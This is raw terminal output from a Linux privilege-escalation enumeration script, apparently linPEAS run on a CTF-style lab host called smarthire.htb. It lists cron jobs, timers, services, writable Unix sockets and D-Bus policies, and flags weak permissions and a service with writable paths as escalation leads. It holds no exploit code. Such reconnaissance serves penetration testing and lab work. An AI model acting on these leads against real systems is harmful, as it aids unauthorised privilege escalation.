[1;32m[0m/[1;32m[0me[1;32m[0mt[1;32m[0mc[1;32m[0m/[1;32m[0mc[1;32m[0mr[1;32m[0mo[1;32m[0mn[1;32m[0m.[1;32m[0mw[1;32m[0me[1;32m[0me[1;32m[0mk[1;32m[0ml[1;32m[0my[1;32m[0m:[1;32m[0m
[1;32m[0mt[1;32m[0mo[1;32m[0mt[1;32m[0ma[1;32m[0ml[1;32m[0m [1;32m[0m1[1;32m[0m6[1;32m[0m
[1;32m[0md[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m4[1;32m[0m0[1;32m[0m9[1;32m[0m6[1;32m[0m [1;32m[0mS[1;32m[0me[1;32m[0mp[1;32m[0m [1;32m[0m1[1;32m[0m1[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m4[1;32m[0m [1;32m[0m.[1;32m[0m
[1;32m[0md[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m1[1;32m[0m0[1;32m[0m6[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m4[1;32m[0m0[1;32m[0m9[1;32m[0m6[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0my[1;32m[0m [1;32m[0m1[1;32m[0m3[1;32m[0m [1;32m[0m1[1;32m[0m6[1;32m[0m:[1;32m[0m1[1;32m[0m4[1;32m[0m [1;32m[0m.[1;32m[0m.[1;32m[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m1[1;32m[0m0[1;32m[0m2[1;32m[0m0[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0mr[1;32m[0m [1;32m[0m1[1;32m[0m7[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m2[1;32m[0m [1;32mman-db[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0mr[1;32m[0m-[1;32m[0m-[1;32m[0m [1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m [1;32m[0m1[1;32m[0m0[1;32m[0m2[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0mr[1;32m[0m [1;32m[0m2[1;32m[0m3[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m2[1;32m[0m [1;32m.placeholder[0m

SHELL=/bin/sh

17 *	* * *	[1;31mroot[0m    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	[1;31mroot[0m	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	[1;31mroot[0m	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	[1;31mroot[0m	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
/etc/crontab:19:17 *	* * *	root    cd / && [1;31mrun-parts[0m --report /etc/cron.hourly
/etc/crontab:20:25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && [1;31mrun-parts[0m --report /etc/cron.daily )
/etc/crontab:21:47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && [1;31mrun-parts[0m --report /etc/cron.weekly )
/etc/crontab:22:52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && [1;31mrun-parts[0m --report /etc/cron.monthly )

[1;34m══╣ [1;32mCron files with hidden carriage returns [1;90m(T1053.003)
[0m
[1;34m══╣ [1;32mChecking for specific cron jobs vulnerabilities [1;90m(T1053.003)
[0mChecking cron directories...
[1;34m══╣ [1;32mrun-parts executable entries [1;90m(T1053.003)
[0m[/etc/cron.hourly]
[/etc/cron.daily]
/etc/cron.daily/apport
/etc/cron.daily/apt-compat
/etc/cron.daily/dpkg
/etc/cron.daily/logrotate
/etc/cron.daily/man-db
[/etc/cron.weekly]
/etc/cron.weekly/man-db
[/etc/cron.monthly]


[1;34m╔══════════╣ [1;32mSystem timers [1;90m(T1053.003)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers
[0m[1;34m══╣ [1;32mActive timers: [1;90m(T1053.003)
[0mNEXT                        LEFT          LAST                        PASSED               UNIT                           ACTIVATES
Thu 2026-07-02 03:45:03 UTC 13min left    Fri 2026-02-20 07:22:49 UTC 4 months 10 days ago [1;32mmotd-news.timer[0m                motd-news.service
Thu 2026-07-02 05:55:59 UTC 2h 24min left Tue 2026-05-05 10:54:26 UTC 1 month 27 days ago  [1;32mapt-daily.timer[0m                apt-daily.service
Thu 2026-07-02 06:44:24 UTC 3h 12min left Thu 2026-07-02 02:41:06 UTC 50min ago            [1;32mapt-daily-upgrade.timer[0m        apt-daily-upgrade.service
Thu 2026-07-02 13:54:24 UTC 10h left      Sat 2025-09-20 10:57:10 UTC 9 months 10 days ago [1;32mman-db.timer[0m                   man-db.service
Thu 2026-07-02 14:20:35 UTC 10h left      Sat 2025-09-20 15:59:03 UTC 9 months 10 days ago [1;32mfwupd-refresh.timer[0m            fwupd-refresh.service
Fri 2026-07-03 00:00:00 UTC 20h left      n/a                         n/a                  [1;32mdpkg-db-backup.timer[0m           dpkg-db-backup.service
Fri 2026-07-03 00:00:00 UTC 20h left      Thu 2026-07-02 02:35:54 UTC 55min ago            [1;32mlogrotate.timer[0m                logrotate.service
Fri 2026-07-03 02:41:06 UTC 23h left      Thu 2026-07-02 02:41:06 UTC 50min ago            update-notifier-download.timer update-notifier-download.service
Fri 2026-07-03 02:50:56 UTC 23h left      Thu 2026-07-02 02:50:56 UTC 40min ago            [1;32msystemd-tmpfiles-clean.timer[0m   systemd-tmpfiles-clean.service
Sat 2026-07-04 07:02:05 UTC 2 days left   Mon 2025-09-15 10:09:43 UTC 9 months 15 days ago update-notifier-motd.timer     update-notifier-motd.service
Sun 2026-07-05 03:10:17 UTC 2 days left   Thu 2026-07-02 02:36:25 UTC 55min ago            [1;32me2scrub_all.timer[0m              e2scrub_all.service
Mon 2026-07-06 01:39:38 UTC 3 days left   Thu 2026-07-02 02:53:47 UTC 37min ago            [1;32mfstrim.timer[0m                   fstrim.service
n/a                         n/a           n/a                         n/a                  apport-autoreport.timer        apport-autoreport.service
n/a                         n/a           n/a                         n/a                  [1;32mua-timer.timer[0m                 ua-timer.service
[1;34m══╣ [1;32mDisabled timers: [1;90m(T1053.003)
[0m[1;34m══╣ [1;32mAdditional timer files: [1;90m(T1053.003)
[0m
[1;34m╔══════════╣ [1;32mServices and Service Files [1;90m(T1543.002,T1007)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services
[0m
[1;34m══╣ [1;32mActive services: [1;90m(T1543.002,T1007)
[0m[1;32mapparmor.service[0m                   loaded active exited  Load AppArmor profiles
[1;32mapport.service[0m                     loaded active exited  LSB: automatic crash report generation
[1;32mauditd.service[0m                     loaded active running Security Auditing Service
[1;32mblk-availability.service[0m           loaded active exited  Availability of block devices
[1;32mcontainerd.service[0m                 loaded active running containerd container runtime
[1;32mcron.service[0m                       loaded active running Regular background program processing daemon
[1;32mdbus.service[0m                       loaded active running D-Bus System Message Bus
  Potential issue in service file: /lib/systemd/system/dbus.service
  └─ RELATIVE_PATH: Could be executing some relative path
[1;32mdocker.service[0m                     loaded active running Docker Application Container Engine
[1;32mfinalrd.service[0m                    loaded active exited  Create final runtime dir for shutdown pivot root
[1;32mgetty@tty1.service[0m                 loaded active running Getty on tty1
[1;32mifup@eth0.service[0m                  loaded active exited  ifup for eth0
  Potential issue in service file: /lib/systemd/system/ifup@.service
  └─ RELATIVE_PATH: Could be executing some relative path
[1;32mifupdown-pre.service[0m               loaded active exited  Helper to synchronize boot up for ifupdown
  Potential issue in service file: /lib/systemd/system/ifupdown-pre.service
  └─ RELATIVE_PATH: Could be executing some relative path
[1;32mirqbalance.service[0m                 loaded active running irqbalance daemon
[1;32mkmod-static-nodes.service[0m          loaded active exited  Create List of Static Device Nodes
[1;32mlvm2-monitor.service[0m               loaded active exited  Monitoring of LVM2 mirrors, snapshots etc. using dmeventd or progress polling
[1;32mlvm2-pvscan@8:4.service[0m            loaded active exited  LVM event activation on device 8:4
[1;32mmlflow.service[0m                     loaded active running MLflow Docker Container
[1;32mModemManager.service[0m               loaded active running Modem Manager
  Potential issue in service: ModemManager.service
  └─ RUNS_AS_ROOT: Service runs as root
[1;32mmultipathd.service[0m                 loaded active running Device-Mapper Multipath Device Controller
[1;32mnetworkd-dispatcher.service[0m        loaded active running Dispatcher daemon for systemd-networkd
[1;32mnetworking.service[0m                 loaded active exited  Raise network interfaces
[1;32mnginx.service[0m                      loaded active running A high performance web server and a reverse proxy server
[1;32mopen-vm-tools.service[0m              loaded active running Service for virtual machines hosted on VMware
[1;32mplymouth-quit-wait.service[0m         loaded active exited  Hold until boot process finishes up
[1;32mplymouth-quit.service[0m              loaded active exited  Terminate Plymouth Boot Screen
[1;32mplymouth-read-write.service[0m        loaded active exited  Tell Plymouth To Write Out Runtime Data
[1;32mpolkit.service[0m                     loaded active running Authorization Manager
[1;32mrsyslog.service[0m                    loaded active running System Logging Service
[1;32msmarthire.service[0m                  loaded active running SmartHire Flask App
[1;32mssh.service[0m                        loaded active running OpenBSD Secure Shell server
[1;32msystemd-binfmt.service[0m             loaded active exited  Set Up Additional Binary Formats
[1;32msystemd-fsck@dev-sda2.service[0m      loaded active exited  File System Check on /dev/sda2
[1;32msystemd-journal-flush.service[0m      loaded active exited  Flush Journal to Persistent Storage
  Potential issue in service file: /lib/systemd/system/systemd-journal-flush.service
  └─ RELATIVE_PATH: Could be executing some relative path
[1;32msystemd-journald.service[0m           loaded active running Journal Service
[1;32msystemd-logind.service[0m             loaded active running User Login Management
[1;32msystemd-modules-load.service[0m       loaded active exited  Load Kernel Modules
[1;32msystemd-random-seed.service[0m        loaded active exited  Load/Save Random Seed
[1;32msystemd-remount-fs.service[0m         loaded active exited  Remount Root and Kernel File Systems
  Potential issue in service: systemd-remount-fs.service
  └─ UNSAFE_CMD: Uses potentially dangerous commands
[1;32msystemd-resolved.service[0m           loaded active running Network Name Resolution
[1;32msystemd-sysctl.service[0m             loaded active exited  Apply Kernel Variables
[1;32msystemd-sysusers.service[0m           loaded active exited  Create System Users
  Potential issue in service file: /lib/systemd/system/systemd-sysusers.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service: systemd-sysusers.service
  └─ UNSAFE_CMD: Uses potentially dangerous commands
[1;32msystemd-timesyncd.service[0m          loaded active running Network Time Synchronization
[1;32msystemd-tmpfiles-setup-dev.service[0m loaded active exited  Create Static Device Nodes in /dev
[1;32msystemd-tmpfiles-setup.service[0m     loaded active exited  Create Volatile Files and Directories
[1;32msystemd-udev-trigger.service[0m       loaded active exited  Coldplug All udev Devices
  Potential issue in service file: /lib/systemd/system/systemd-udev-trigger.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service: systemd-udev-trigger.service
  └─ UNSAFE_CMD: Uses potentially dangerous commands
[1;32msystemd-udevd.service[0m              loaded active running Rule-based Manager for Device Events and Files
  Potential issue in service file: /lib/systemd/system/systemd-udevd.service
  └─ RELATIVE_PATH: Could be executing some relative path
[1;32msystemd-update-utmp.service[0m        loaded active exited  Record System Boot/Shutdown in UTMP
[1;32msystemd-user-sessions.service[0m      loaded active exited  Permit User Sessions
[1;32mubuntu-fan.service[0m                 loaded active exited  Ubuntu FAN network setup
[1;32mudisks2.service[0m                    loaded active running Disk Manager
[1;32mvgauth.service[0m                     loaded active running Authentication service for virtual machines hosted on VMware
[1;32mLOAD[0m   = Reflects whether the unit definition was properly loaded.
[1;32mACTIVE[0m = The high-level unit activation state, i.e. generalization of SUB.
[1;32mSUB[0m    = The low-level unit activation state, values depend on unit type.
[1;32m51[0m loaded units listed.

[1;34m══╣ [1;32mDisabled services: [1;90m(T1543.002,T1007)
[0m[1;32mconsole-getty.service[0m                  disabled disabled
[1;32mdebug-shell.service[0m                    disabled disabled
[1;32mifupdown-wait-online.service[0m           disabled enabled
[1;32miscsid.service[0m                         disabled enabled
[1;32mnftables.service[0m                       disabled enabled
[1;32mrsync.service[0m                          disabled enabled
[1;32mserial-getty@.service[0m                  disabled enabled
[1;32msystemd-boot-check-no-failures.service[0m disabled disabled
[1;32msystemd-network-generator.service[0m      disabled enabled
[1;32msystemd-networkd-wait-online.service[0m   disabled disabled
[1;32msystemd-sysext.service[0m                 disabled enabled
  Potential issue in service file: /lib/systemd/system/systemd-sysext.service
  └─ RELATIVE_PATH: Could be executing some relative path
[1;32msystemd-time-wait-sync.service[0m         disabled disabled
[1;32mupower.service[0m                         disabled enabled
[1;32m13[0m unit files listed.

[1;34m══╣ [1;32mAdditional service files: [1;90m(T1543.002,T1007)
[0m  Potential issue in service file: /etc/systemd/system/multi-user.target.wants/grub-common.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service file: /etc/systemd/system/sleep.target.wants/grub-common.service
  └─ RELATIVE_PATH: Could be executing some relative path
[1;32mYou can't write on systemd PATH[0m

[1;34m╔══════════╣ [1;32mSystemd Information [1;90m(T1543.002)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths
[0m[1;34m═╣ [1;32mSystemd version and vulnerabilities? .............. [0m[0m[1;31m249.11[0m
[1;31m3.20[0m
[1;34m═╣ [1;32mServices running as root? ..... [0m[0m
[1;34m═╣ [1;32mRunning services with dangerous capabilities? ... [0m[0m
[1;34m═╣ [1;32mServices with writable paths? . [0m[0m[1;31msmarthire.service: /var/www/smarthire.htb/.venv/bin/gunicorn (from ExecStart=/var/www/smarthire.htb/.venv/bin/gunicorn --workers 4 wsgi:app)[0m

[1;34m╔══════════╣ [1;32mSystemd PATH [1;90m(T1543.002)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths
[0mPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

[1;34m╔══════════╣ [1;32mAnalyzing .socket files [1;90m(T1559)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets
[0m
[1;34m╔══════════╣ [1;32mUnix Sockets Analysis [1;90m(T1571,T1049)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets
[0m[1;32m/run/containerd/containerd.sock[0m
[1;32m/run/containerd/containerd.sock.ttrpc[0m
[1;31m/run/dbus/system_bus_socket[0m
  └─([1;31mRead Write (Weak Permissions: 666) [0m)
  └─([1;31mOwned by root[0m)
[1;31;103m  └─High risk: root-owned and writable Unix socket[0m
[1;32m/run/docker.sock[0m
[1;31m/run/irqbalance/irqbalance766.sock[0m
  └─([1;31mRead Execute [0m)
  └─([1;31mOwned by root[0m)
[1;32m/run/systemd/fsck.progress[0m
[1;32m/run/systemd/inaccessible/sock[0m
[1;31m/run/systemd/io.system.ManagedOOM[0m
  └─([1;31mRead Write (Weak Permissions: 666) [0m)
  └─([1;31mOwned by root[0m)
[1;31;103m  └─High risk: root-owned and writable Unix socket[0m
[1;31m/run/systemd/journal/dev-log[0m
  └─([1;31mRead Write (Weak Permissions: 666) [0m)
  └─([1;31mOwned by root[0m)
[1;31;103m  └─High risk: root-owned and writable Unix socket[0m
[1;32m/run/systemd/journal/io.systemd.journal[0m
[1;31m/run/systemd/journal/socket[0m
  └─([1;31mRead Write (Weak Permissions: 666) [0m)
  └─([1;31mOwned by root[0m)
[1;31;103m  └─High risk: root-owned and writable Unix socket[0m
[1;31m/run/systemd/journal/stdout[0m
  └─([1;31mRead Write (Weak Permissions: 666) [0m)
  └─([1;31mOwned by root[0m)
[1;31;103m  └─High risk: root-owned and writable Unix socket[0m
[1;31m/run/systemd/journal/syslog[0m
  └─([1;31mRead Write (Weak Permissions: 666) [0m)
  └─([1;31mOwned by root[0m)
[1;31;103m  └─High risk: root-owned and writable Unix socket[0m
[1;31m/run/systemd/notify[0m
  └─([1;31mRead Write Execute (Weak Permissions: 777) [0m)
  └─([1;31mOwned by root[0m)
[1;31;103m  └─High risk: root-owned and writable Unix socket[0m
[1;31m/run/systemd/private[0m
  └─([1;31mRead Write Execute (Weak Permissions: 777) [0m)
  └─([1;31mOwned by root[0m)
[1;31;103m  └─High risk: root-owned and writable Unix socket[0m
[1;31m/run/systemd/resolve/io.systemd.Resolve[0m
  └─([1;31mRead Write (Weak Permissions: 666) [0m)
[1;31m/run/systemd/userdb/io.systemd.DynamicUser[0m
  └─([1;31mRead Write (Weak Permissions: 666) [0m)
  └─([1;31mOwned by root[0m)
[1;31;103m  └─High risk: root-owned and writable Unix socket[0m
[1;32m/run/udev/control[0m
[1;31m/run/uuidd/request[0m
  └─([1;31mRead Write (Weak Permissions: 666) [0m)
  └─([1;31mOwned by root[0m)
[1;31;103m  └─High risk: root-owned and writable Unix socket[0m
[1;31m/run/vmware/guestServicePipe[0m
  └─([1;31mRead Write (Weak Permissions: 666) [0m)
  └─([1;31mOwned by root[0m)
[1;31;103m  └─High risk: root-owned and writable Unix socket[0m
[1;31m/var/run/vmware/guestServicePipe[0m
  └─([1;31mRead Write (Weak Permissions: 666) [0m)
  └─([1;31mOwned by root[0m)
[1;31;103m  └─High risk: root-owned and writable Unix socket[0m

[1;34m╔══════════╣ [1;32mD-Bus Analysis [1;90m(T1559.001)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus
[0m[1;32mNAME[0m                            PID PROCESS         USER             CONNECTION    UNIT                        SESSION DESCRIPTION
[1;32m:1.0[0m                            676 [1;34msys[0mtemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service   -       -
[1;32m:1.1[0m                            675 [1;34msystemd-resolve[0m systemd-resolve  :1.1          systemd-resolved.service    -       -
[1;32m:1.2[0m                              1 [1;34msys[0mtemd         [1;31mroot[0m             :1.2          init.scope                  -       -
[1;32m:1.3[0m                            769 polkitd         [1;31mroot[0m             :1.3          polkit.service              -       -
[1;32m:1.4[0m                            772 udisksd         [1;31mroot[0m             :1.4          udisks2.service             -       -
[1;32m:1.496[0m                        36474 busctl          [1;95msvcweb[0m           :1.496        smarthire.service           -       -
[1;32m:1.5[0m                            786 ModemManager    [1;31mroot[0m             :1.5          ModemManager.service        -       -
[1;32m:1.6[0m                            771 [1;34msys[0mtemd-logind  [1;31mroot[0m             :1.6          systemd-logind.service      -       -
[1;32m:1.8[0m                            767 networkd-dispat [1;31mroot[0m             :1.8          networkd-dispatcher.service -       -
[1;32mcom.ubuntu.SoftwareProperties[0m     - -               -                (activatable) -                           -       -
[1;32morg.freedesktop.DBus[0m              1 [1;34msys[0mtemd         [1;31mroot[0m             -             init.scope                  -       -
[1;32morg.freedesktop.ModemManager1[0m   786 ModemManager    [1;31mroot[0m             :1.5          ModemManager.service        -       -
[1;32morg.freedesktop.PackageKit[0m        - -               -                (activatable) -                           -       -
[1;32morg.freedesktop.PolicyKit1[0m      769 polkitd         [1;31mroot[0m             :1.3          polkit.service              -       -
[1;32morg.freedesktop.UDisks2[0m         772 udisksd         [1;31mroot[0m             :1.4          udisks2.service             -       -
[1;32morg.freedesktop.UPower[0m            - -               -                (activatable) -                           -       -
[1;32morg.freedesktop.bolt[0m              - -               -                (activatable) -                           -       -
[1;32morg.freedesktop.fwupd[0m             - -               -                (activatable) -                           -       -
[1;32morg.freedesktop.hostname1[0m         - -               -                (activatable) -                           -       -
[1;32morg.freedesktop.locale1[0m           - -               -                (activatable) -                           -       -
[1;32morg.freedesktop.login1[0m          771 [1;34msys[0mtemd-logind  [1;31mroot[0m             :1.6          systemd-logind.service      -       -
[1;32morg.freedesktop.network1[0m          - -               -                (activatable) -                           -       -
[1;32morg.freedesktop.resolve1[0m        675 [1;34msystemd-resolve[0m systemd-resolve  :1.1          systemd-resolved.service    -       -
[1;32morg.freedesktop.[1;34msys[0mtemd1[0m          1 systemd         [1;31mroot[0m             :1.2          init.scope                  -       -
[1;32morg.freedesktop.thermald[0m          - -               -                (activatable) -                           -       -
[1;32morg.freedesktop.timedate1[0m         - -               -                (activatable) -                           -       -
[1;32morg.freedesktop.time[1;34msync[0m1[0m       676 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service   -       -

[1;34m╔══════════╣ [1;32mD-Bus Configuration Files [1;90m(T1559.001)
[0mAnalyzing /etc/dbus-1/system.d/com.ubuntu.SoftwareProperties.conf:
  └─([1;31mAllow rules in default context[0m)
             └─     <allow send_destination="com.ubuntu.SoftwareProperties"
            <allow send_destination="com.ubuntu.SoftwareProperties"
            <allow send_destination="com.ubuntu.DeviceDriver"
Analyzing /etc/dbus-1/system.d/dnsmasq.conf:
  └─([1;31mWeak user policy found[0m)
     └─         <policy user="[1;34mdnsmasq[0m">
Analyzing /etc/dbus-1/system.d/org.freedesktop.ModemManager1.conf:
  └─([1;31mAllow rules in default context[0m)
             └─     <!-- Methods listed here are explicitly allowed or PolicyKit protected.
Analyzing /etc/dbus-1/system.d/org.freedesktop.PackageKit.conf:
  └─([1;31mAllow rules in default context[0m)
             └─     <allow send_destination="org.freedesktop.PackageKit"
            <allow send_destination="org.freedesktop.PackageKit"
            <allow send_destination="org.freedesktop.PackageKit"
Analyzing /etc/dbus-1/system.d/org.freedesktop.thermald.conf:
  └─([1;31mWeak group policy found[0m)
     └─         <policy group="power">
  └─([1;31mAllow rules in default context[0m)
             └─                 <allow receive_sender="org.freedesktop.thermald"/>
                        <allow send_destination="org.freedesktop.thermald"/>
Activation definitions in /usr/lib/python3/dist-packages/uaclient/api/u/pro/services:
Activation definitions in /usr/share/dbus-1/services:
/usr/share/dbus-1/services/org.freedesktop.systemd1.service:11:Name=org.freedesktop.systemd1
/usr/share/dbus-1/services/org.freedesktop.systemd1.service:12:[1;31mExec=[0mExec=[0m/bin/false
/usr/share/dbus-1/services/org.freedesktop.systemd1.service:13:[1;31mUser=[0mUser=[0mroot
Activation definitions in /usr/share/dbus-1/system-services:
/usr/share/dbus-1/system-services/org.freedesktop.PolicyKit1.service:2:Name=org.freedesktop.PolicyKit1
/usr/share/dbus-1/system-services/org.freedesktop.PolicyKit1.service:3:[1;31mExec=[0mExec=[0m/usr/libexec/polkitd --no-debug
/usr/share/dbus-1/system-services/org.freedesktop.PolicyKit1.service:4:[1;31mUser=[0mUser=[0mroot
/usr/share/dbus-1/system-services/org.freedesktop.ModemManager1.service:8:Name=org.freedesktop.ModemManager1
/usr/share/dbus-1/system-services/org.freedesktop.ModemManager1.service:9:[1;31mExec=[0mExec=[0m/usr/sbin/ModemManager
/usr/share/dbus-1/system-services/org.freedesktop.ModemManager1.service:10:[1;31mUser=[0mUser=[0mroot
/usr/share/dbus-1/system-services/org.freedesktop.thermald.service:2:Name=org.freedesktop.thermald
/usr/share/dbus-1/system-services/org.freedesktop.thermald.service:3:[1;31mExec=[0mExec=[0m/bin/false
/usr/share/dbus-1/system-services/org.freedesktop.thermald.service:4:[1;31mUser=[0mUser=[0mroot
/usr/share/dbus-1/system-services/org.freedesktop.systemd1.service:11:Name=org.freedesktop.systemd1
/usr/share/dbus-1/system-services/org.freedesktop.systemd1.service:12:[1;31mExec=[0mExec=[0m/bin/false
/usr/share/dbus-1/system-services/org.freedesktop.systemd1.service:13:[1;31mUser=[0mUser=[0mroot
/usr/share/dbus-1/system-services/org.freedesktop.fwupd.service:2:Name=org.freedesktop.fwupd
/usr/share/dbus-1/system-services/org.freedesktop.fwupd.service:4:[1;31mExec=[0mExec=[0m/usr/libexec/fwupd/fwupd
/usr/share/dbus-1/system-services/org.freedesktop.fwupd.service:5:[1;31mUser=[0mUser=[0mroot
/usr/share/dbus-1/system-services/org.freedesktop.login1.service:11:Name=org.freedesktop.login1
/usr/share/dbus-1/system-services/org.freedesktop.login1.service:12:[1;31mExec=[0mExec=[0m/bin/false
/usr/share/dbus-1/system-services/org.freedesktop.login1.service:13:[1;31mUser=[0mUser=[0mroot
/usr/share/dbus-1/system-services/org.freedesktop.resolve1.service:11:Name=org.freedesktop.resolve1
/usr/share/dbus-1/system-services/org.freedesktop.resolve1.service:12:[1;31mExec=[0mExec=[0m/bin/false
/usr/share/dbus-1/system-services/org.freedesktop.resolve1.service:13:[1;31mUser=[0mUser=[0mroot
/usr/share/dbus-1/system-services/org.freedesktop.PackageKit.service:2:Name=org.freedesktop.PackageKit
/usr/share/dbus-1/system-services/org.freedesktop.PackageKit.service:3:[1;31mExec=[0mExec=[0m/usr/libexec/packagekitd
/usr/share/dbus-1/system-services/org.freedesktop.PackageKit.service:4:[1;31mUser=[0mUser=[0mroot
/usr/share/dbus-1/system-services/com.ubuntu.SoftwareProperties.service:2:Name=com.ubuntu.SoftwareProperties
/usr/share/dbus-1/system-services/com.ubuntu.SoftwareProperties.service:3:[1;31mExec=[0mExec=[0m/usr/lib/software-properties/software-properties-dbus
/usr/share/dbus-1/system-services/com.ubuntu.SoftwareProperties.service:4:[1;31mUser=[0mUser=[0mroot
/usr/share/dbus-1/system-services/org.freedesktop.locale1.service:11:Name=org.freedesktop.locale1
/usr/share/dbus-1/system-services/org.freedesktop.locale1.service:12:[1;31mExec=[0mExec=[0m/bin/false
/usr/share/dbus-1/system-services/org.freedesktop.locale1.service:13:[1;31mUser=[0mUser=[0mroot
/usr/share/dbus-1/system-services/org.freedesktop.timedate1.service:11:Name=org.freedesktop.timedate1
/usr/share/dbus-1/system-services/org.freedesktop.timedate1.service:12:[1;31mExec=[0mExec=[0m/bin/false
/usr/share/dbus-1/system-services/org.freedesktop.timedate1.service:13:[1;31mUser=[0mUser=[0mroot
/usr/share/dbus-1/system-services/org.freedesktop.hostname1.service:9:Name=org.freedesktop.hostname1
/usr/share/dbus-1/system-services/org.freedesktop.hostname1.service:10:[1;31mExec=[0mExec=[0m/bin/false
/usr/share/dbus-1/system-services/org.freedesktop.hostname1.service:11:[1;31mUser=[0mUser=[0mroot
/usr/share/dbus-1/system-services/org.freedesktop.UPower.service:2:Name=org.freedesktop.UPower
/usr/share/dbus-1/system-services/org.freedesktop.UPower.service:3:[1;31mExec=[0mExec=[0m/usr/libexec/upowerd
/usr/share/dbus-1/system-services/org.freedesktop.UPower.service:4:[1;31mUser=[0mUser=[0mroot
/usr/share/dbus-1/system-services/org.freedesktop.timesync1.service:11:Name=org.freedesktop.timesync1
/usr/share/dbus-1/system-services/org.freedesktop.timesync1.service:12:[1;31mExec=[0mExec=[0m/bin/false
/usr/share/dbus-1/system-services/org.freedesktop.timesync1.service:13:[1;31mUser=[0mUser=[0mroot
/usr/share/dbus-1/system-services/org.freedesktop.UDisks2.service:2:Name=org.freedesktop.UDisks2
/usr/share/dbus-1/system-services/org.freedesktop.UDisks2.service:3:[1;31mExec=[0mExec=[0m/usr/libexec/udisks2/udisksd
/usr/share/dbus-1/system-services/org.freedesktop.UDisks2.service:4:[1;31mUser=[0mUser=[0mroot
/usr/share/dbus-1/system-services/org.freedesktop.bolt.service:2:Name=org.freedesktop.bolt
/usr/share/dbus-1/system-services/org.freedesktop.bolt.service:3:[1;31mExec=[0mExec=[0m/usr/libexec/boltd
/usr/share/dbus-1/system-services/org.freedesktop.bolt.service:4:[1;31mUser=[0mUser=[0mroot
/usr/share/dbus-1/system-services/org.freedesktop.network1.service:11:Name=org.freedesktop.network1
/usr/share/dbus-1/system-services/org.freedesktop.network1.service:12:[1;31mExec=[0mExec=[0m/bin/false
/usr/share/dbus-1/system-services/org.freedesktop.network1.service:13:[1;31mUser=[0mUser=[0mroot

[1;34m══╣ [1;32mD-Bus Session Bus Analysis [1;90m(T1559.001)
[0m([1;32mAccess to session bus available[0m)


[1;34m╔══════════╣ [1;32mLegacy r-commands (rsh/rlogin/rexec) and host-based trust [1;90m(T1021.004)
[0m
[1;34m══╣ [1;32mListening r-services (TCP 512-514) [1;90m(T1021.004)
[0m
[1;34m══╣ [1;32msystemd units exposing r-services [1;90m(T1021.004)
[0m[1;90mrlogin|rsh|rexec units Not Found
[0m
[1;34m══╣ [1;32minetd/xinetd configuration for r-services [1;90m(T1021.004)
[0m[1;90m/etc/inetd.conf Not Found
[0m[1;90m/etc/xinetd.d Not Found
[0m
[1;34m══╣ [1;32mInstalled r-service server packages [1;90m(T1021.004)
[0m  No related packages found via dpkg

[1;34m══╣ [1;32m/etc/hosts.equiv and /etc/shosts.equiv [1;90m(T1021.004)
[0m
